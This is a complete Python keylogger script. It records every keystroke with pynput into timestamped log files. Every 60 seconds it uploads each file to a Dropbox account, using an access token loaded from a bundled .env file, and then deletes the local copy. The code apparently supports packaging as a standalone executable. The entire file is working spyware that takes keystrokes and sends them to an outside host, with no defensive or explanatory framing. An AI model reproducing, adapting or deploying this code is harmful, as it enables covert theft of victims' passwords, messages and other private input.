import os
import sys
import time
import dropbox
from pynput import keyboard
from datetime import datetime
from unidecode import unidecode

def load_env():
    env_path = os.path.join(sys._MEIPASS, '.env') if hasattr(sys, '_MEIPASS') else '.env'
    with open(env_path) as f:
        for line in f:
            if line.startswith('DROPBOX_ACCESS_TOKEN'):
                key, value = line.strip().split('=', 1)
                os.environ[key] = value

# Load environment variables
load_env()

# Dropbox access token
ACCESS_TOKEN = os.getenv('DROPBOX_ACCESS_TOKEN')

# Initialize Dropbox client
dbx = dropbox.Dropbox(ACCESS_TOKEN)

def on_press(key, log_file):
    try:
        with open(log_file, 'a') as f:
            f.write(unidecode(f'{key.char}'))
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(unidecode(f'{key}'))

def upload_to_dropbox(log_file):
    with open(log_file, 'rb') as f:
        dbx.files_upload(f.read(), f'/{os.path.basename(log_file)}', mode=dropbox.files.WriteMode.overwrite)
    os.remove(log_file)

def main():
    while True:
        log_file = f'/keylog_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
        listener = keyboard.Listener(on_press=lambda key: on_press(key, log_file))
        listener.start()

        time.sleep(60)
        listener.stop()
        if os.path.exists(log_file):
            try:
                upload_to_dropbox(log_file)
            except Exception as e:
                print(f'Failed to upload to Dropbox: {e}')

if __name__ == '__main__':
    main()